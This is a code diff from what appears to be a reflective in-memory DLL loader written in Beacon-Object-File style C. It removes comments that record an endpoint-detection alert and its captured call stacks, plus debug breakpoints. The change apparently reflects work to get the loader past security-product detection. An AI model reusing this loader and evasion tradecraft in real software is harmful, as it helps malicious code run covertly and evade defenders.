@@ -84,21 +84,6 @@ void go ( )
     PICO * pico_dst = ( PICO * ) KERNEL32$VirtualAlloc ( NULL, sizeof ( PICO ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
 
     /* load it into memory */
-    // !!! Alert: Malicious Behavior Detection Alert: Suspicious Network Module LoadLibrary
-    // !!! Detects attempts to load a Microsoft networking related module from a potentially altered call stack in order to conceal the true source of the call.
-    /*
-    [0x0]   KERNELBASE!LoadLibraryA   0xc8e9d8   0x7fff2be49aa9   
-    [0x1]   KERNELBASE!CreateAppContainerToken+0x18b9   0xc8e9e0   0x7fff2ce0e8d7   
-    [0x2]   KERNEL32!BaseThreadInitThunk+0x17   0xc8f4a0   0x7fff2eb4c53c   
-    [0x3]   ntdll!RtlUserThreadStart+0x2c   0xc8f4d0   0x0   
-
-
-    [0x0]   KERNELBASE!LoadLibraryA   0xc8f3a8   0x7fff2bf4c70a   
-    [0x1]   KERNELBASE!GetConsoleAliasExesW+0xea   0xc8f3b0   0x7fff2ce0e8d7   
-    [0x2]   KERNEL32!BaseThreadInitThunk+0x17   0xc8f4a0   0x7fff2eb4c53c   
-    [0x3]   ntdll!RtlUserThreadStart+0x2c   0xc8f4d0   0x0   
-    */
-    __debugbreak();
     PicoLoad ( &funcs, pico_src, pico_dst->code, pico_dst->data );
 
     /* make code section RX */
@@ -148,15 +133,14 @@ void go ( )
     memory.Dll.BaseAddress = ( PVOID ) ( dll_dst );
     memory.Dll.Size        = SizeOfDLL ( &dll_data );
 
-    // !!! Alert: Malicious Behavior Detection Alert: Suspicious Network Module LoadLibrary
-    // !!! Detects attempts to load a Microsoft networking related module from a potentially altered call stack in order to conceal the true source of the call.
-    __debugbreak();
     ProcessImports ( &funcs, &dll_data, dll_dst );
     fix_section_permissions ( &dll_data, dll_src, dll_dst, &memory.Dll );
 
     /* call setup_memory to give PICO the memory info */
     ( ( SETUP_MEMORY ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_memory ( ) ) ) ( &memory );
     
+    // __debugbreak();
+
     /* now run the DLL */
     DLLMAIN_FUNC entry_point = EntryPoint ( &dll_data, dll_dst );
 
